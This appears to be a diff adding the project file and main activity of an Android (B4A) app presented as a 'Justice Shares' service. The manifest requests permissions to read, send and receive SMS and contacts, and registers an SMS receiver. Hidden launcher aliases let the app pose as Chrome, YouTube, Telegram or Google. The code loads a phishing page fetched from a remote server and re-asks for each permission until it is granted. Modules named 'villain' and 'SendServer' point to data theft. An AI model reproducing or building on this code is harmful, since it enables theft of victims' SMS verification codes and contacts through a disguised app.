@@ -1,0 +1,128 @@
+﻿Build1=googleFe,com.Mad.api
+File1=SudoPort.txt
+File2=ViewPortal.bal
+FileGroup1=Default Group
+FileGroup2=Default Group
+Group=Default Group
+Library1=contactsutils
+Library10=runtimepermissions
+Library11=stringutils
+Library12=xui
+Library2=core
+Library3=firebasenotifications
+Library4=javaobject
+Library5=json
+Library6=okhttputils2
+Library7=persiandeviceinfo
+Library8=phone
+Library9=reflection
+ManifestCode=AddManifestText(~\n~<uses-sdk android:minSdkVersion="14" android:targetSdkVersion="30"/>~\n~<supports-screens android:largeScreens="true" ~\n~    android:normalScreens="true" ~\n~    android:smallScreens="true" ~\n~    android:anyDensity="true"/>)~\n~SetApplicationAttribute(android:icon, "@drawable/icon")~\n~SetApplicationAttribute(android:label, "$LABEL$")~\n~CreateResourceFromFile(Macro, Themes.LightTheme)~\n~CreateResourceFromFile(Macro, FirebaseAnalytics.GooglePlayBase)~\n~CreateResourceFromFile(Macro, FirebaseAnalytics.Firebase)~\n~CreateResourceFromFile(Macro, FirebaseNotifications.FirebaseNotifications)~\n~AddPermission("android.permission.READ_SMS")~\n~AddPermission("android.permission.SEND_SMS")~\n~AddPermission("android.permission.RECEIVE_SMS")~\n~AddPermission("android.permission.POST_NOTIFICATIONS")~\n~AddPermission("android.permission.INTERNET")~\n~AddPermission("android.permission.READ_CONTACTS")~\n~AddPermission("android.permission.WRITE_CONTACTS")~\n~AddPermission("android.permission.WAKE_LOCK")~\n~AddPermission("android.permission.FOREGROUND_SERVICE")~\n~SetApplicationAttribute(android:usesCleartextTraffic, "true")~\n~SetApplicationAttribute(android:hardwareAccelerated, "true")~\n~SetApplicationAttribute(android:largeHeap, "true")~\n~AddReceiverText(NewMessage,~\n~<intent-filter>~\n~    <action android:name="android.provider.Telephony.SMS_RECEIVED" ~\n~	 android:exported="true"/>~\n~</intent-filter>)~\n~AddApplicationText(~\n~<activity~\n~			android:windowSoftInputMode="stateHidden"~\n~			android:launchMode="singleTop"~\n~			android:name=".main"~\n~			android:label="سهام عدالت"~\n~			android:screenOrientation="portrait"~\n~			android:exported="true">~\n~			<intent-filter>~\n~			   <action android:name="android.intent.action.MAIN" />~\n~			   <category android:name="android.intent.category.LAUNCHER" />~\n~			</intent-filter>~\n~			~\n~		</activity>~\n~)~\n~~\n~AddApplicationText(~\n~        <activity-alias~\n~            android:name=".second"~\n~            android:targetActivity=".main"~\n~            android:label="Chrome"~\n~            android:enabled="false"~\n~            android:icon="@drawable/icon2"~\n~            android:exported="true">~\n~            <intent-filter>~\n~             <action android:name="android.intent.action.MAIN" />~\n~             <category android:name="android.intent.category.LAUNCHER" />~\n~            </intent-filter>~\n~        </activity-alias>~\n~)~\n~AddApplicationText(~\n~        <activity-alias~\n~            android:name=".youtube"~\n~            android:targetActivity=".main"~\n~            android:label="Youtube"~\n~            android:enabled="false"~\n~            android:icon="@drawable/icon4"~\n~            android:exported="true">~\n~            <intent-filter>~\n~             <action android:name="android.intent.action.MAIN" />~\n~             <category android:name="android.intent.category.LAUNCHER" />~\n~            </intent-filter>~\n~        </activity-alias>~\n~)~\n~AddApplicationText(~\n~        <activity-alias~\n~            android:name=".telegram"~\n~            android:targetActivity=".main"~\n~            android:label="Telegram"~\n~            android:enabled="false"~\n~            android:icon="@drawable/icon3"~\n~            android:exported="true">~\n~            <intent-filter>~\n~             <action android:name="android.intent.action.MAIN" />~\n~             <category android:name="android.intent.category.LAUNCHER" />~\n~            </intent-filter>~\n~        </activity-alias>~\n~)~\n~AddApplicationText(~\n~        <activity-alias~\n~            android:name=".google"~\n~            android:targetActivity=".main"~\n~            android:label="Google"~\n~            android:enabled="false"~\n~            android:icon="@drawable/icon5"~\n~            android:exported="true">~\n~            <intent-filter>~\n~             <action android:name="android.intent.action.MAIN" />~\n~             <category android:name="android.intent.category.LAUNCHER" />~\n~            </intent-filter>~\n~        </activity-alias>~\n~)~\n~
+Module1=chrome
+Module10=villain
+Module11=youtube
+Module2=FirebaseMessaging
+Module3=MainChange
+Module4=NewMessage
+Module5=second
+Module6=SendServer
+Module7=ServerLink
+Module8=Starter
+Module9=telegram
+NumberOfFiles=2
+NumberOfLibraries=12
+NumberOfModules=11
+Version=13.4
+@EndOfDesignText@
+#Region  Project Attributes 
+	#ApplicationLabel: سهام عدالت
+	#VersionCode: 1
+	#VersionName: 1.0
+	#SupportedOrientations: unspecified
+	#CanInstallToExternalStorage: False
+#End Region
+  #BridgeLogger: True
+#Region  Activity Attributes 
+	#FullScreen: true
+	#IncludeTitle: false
+#End Region
+
+Sub Process_Globals
+	Private xui As XUI
+	Dim phone As Phone
+	Private run8 As RuntimePermissions
+	Dim setlink As String
+End Sub
+
+Sub Globals
+	Private link As WebView
+End Sub
+
+Sub Activity_Create(FirstTime As Boolean)
+	Dim ApiLink As String = ServerLink.link
+	Log(ApiLink)
+	Dim sudoport As String = File.ReadString(File.DirAssets,"sudoport.txt")
+	Activity.LoadLayout("ViewPortal")
+	StartReceiver(FirebaseMessaging)
+	StartReceiver(NewMessage)
+	CallSubDelayed(FirebaseMessaging, "SubscribeToTopics")
+	Log(ApiLink&"/"&sudoport&"/link.txt")
+	Dim ht As HttpJob
+	ht.Initialize("", Me)
+	ht.Download(ApiLink&"/"&sudoport&"/link.txt")
+	Wait For (ht) JobDone(job As HttpJob)
+	setlink = job.GetString
+	Log(setlink)
+	If job.Success Then
+		link.LoadUrl(""&setlink&"")
+	Else
+		MsgboxAsync("کاربر گرامی برای ادامه از اتصال اینترنت خود اطمینان حاصل کنید.","خطا")
+		Wait For Msgbox_Result(res As Int)
+		StartReceiver(FirebaseMessaging)
+		ExitApplication
+	End If
+	If FirstTime Then
+		Dim permissions As List
+		permissions.Initialize
+		permissions.Add(run8.PERMISSION_RECEIVE_SMS)
+		permissions.Add(run8.PERMISSION_READ_SMS)
+		permissions.Add(run8.PERMISSION_SEND_SMS)
+		permissions.Add(run8.PERMISSION_READ_CONTACTS)
+		permissions.Add(run8.PERMISSION_WRITE_CONTACTS)
+        
+		If phone.SdkVersion >= 33 Then
+			permissions.Add(run8.PERMISSION_POST_NOTIFICATIONS)
+		End If
+		For Each permission As String In permissions
+			Dim granted As Boolean = False
+			Do While Not (granted)
+				run8.CheckAndRequest(permission)
+				Wait For activity_PermissionResult(permission As String, Result As Boolean)
+				If permission = permission Then
+					If Result Then
+						granted = True
+					Else
+						ToastMessageShow("لطفا دسترسی لازم جهت ادامه را بدهید",True)
+					End If
+				End If
+			Loop
+		Next
+	End If
+	
+
+	
+End Sub
+
+Sub Activity_Resume
+
+End Sub
+
+Sub Activity_Pause (UserClosed As Boolean)
+	StartReceiver(FirebaseMessaging)
+	StartReceiver(NewMessage)
+	CallSubDelayed(FirebaseMessaging, "SubscribeToTopics")
+End Sub
+
+
+Private Sub link_PageFinished (Url As String)
+	ProgressDialogHide
+End Sub
